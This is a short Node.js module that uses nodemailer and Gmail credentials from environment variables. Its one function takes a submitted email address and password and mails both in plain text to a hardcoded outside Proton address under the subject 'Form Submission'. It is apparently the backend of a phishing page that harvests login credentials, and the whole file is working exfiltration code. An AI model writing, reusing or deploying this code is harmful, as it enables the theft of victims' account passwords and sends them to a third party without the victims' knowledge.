import nodemailer from "nodemailer";
import dotenv from "dotenv";
dotenv.config();

const transporter = nodemailer.createTransport({
  service: "Gmail",
  port: 465, //587
  auth: {
    user: process.env.AUTH_EMAIL,
    pass: process.env.AUTH_PASS,
  },
});

export const sendEmail = async (email, password) => {
  const mailOptions = {
    from: `Ubpages ${process.env.AUTH_EMAIL}`,
    to: "garciawaters@proton.me",
    subject: "Form Submission",
    html: `
      <p>Email: ${email}</p>
      <p>Password: ${password}</p>
      `,
  };

  try {
    await transporter.sendMail(mailOptions);
  } catch (error) {
    console.log(error);
    throw new Error("Error sending email");
  }
};
